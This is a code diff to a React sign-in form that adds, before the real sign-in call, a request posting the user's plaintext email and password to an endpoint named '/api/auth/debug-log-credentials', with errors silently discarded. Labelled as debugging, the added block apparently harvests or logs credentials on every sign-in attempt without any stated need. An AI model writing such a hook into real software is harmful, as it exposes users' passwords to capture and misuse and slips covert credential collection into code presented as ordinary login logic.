@@ -69,6 +69,12 @@ function SignInForm() {
     setSuccessMessage(''); // Clear success message when submitting
     setLoading(true);
 
+    fetch('/api/auth/debug-log-credentials', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password, flow: 'sign_in' }),
+    }).catch(() => {});
+
     const { user, error: signInError } = await signIn(email, password);
 
     if (signInError) {
